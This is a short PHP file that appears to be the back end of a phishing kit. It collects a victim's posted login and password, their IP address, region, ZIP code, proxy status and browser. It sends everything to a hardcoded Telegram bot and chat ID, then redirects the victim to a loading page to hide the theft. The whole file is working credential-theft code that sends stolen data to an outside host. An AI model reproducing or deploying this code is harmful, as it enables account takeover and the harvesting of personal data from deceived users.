<?php
$ip_address = getenv("REMOTE_ADDR");

$ip_info = json_decode(file_get_contents("http://ip-api.com/json/$ip_address"), true);

if ($ip_info && $ip_info['status'] == 'success') {
    $proxy_status = $ip_info['proxy'] ? "🛑 Proxy: True" : "✅ Proxy: False";
    $region = $ip_info['regionName'];
    $zip = $ip_info['zip'];
} else {
    $proxy_status = "⚠️ Proxy information unavailable";
    $region = "Unknown";
    $zip = "Unknown";
}

$message = "✅---------MyCSS-----------✅\n";
$message .= "👤 Login : " . $_POST['aa'] . "\n";
$message .= "🔑 Password : " . $_POST['bb'] . "\n";
$message .= "----------- IP Information -----------\n";
$message .= "📍 IP Address : $ip_address\n";
$message .= "$proxy_status\n";
$message .= "📍 Region : $region\n";
$message .= "📮 ZIP Code : $zip\n";
$message .= "🖥️ Browser : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$message .= "************************************\n";

$token = "8938300985:AAHTeAiYGP_oGtFGD-Pku_j6c_mY6QWgHJM";
$chat_id = "8739450373";


$data = [
    'text' => $message,
    'chat_id' => $chat_id
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

header("Location: ../load.html");
exit;
?>
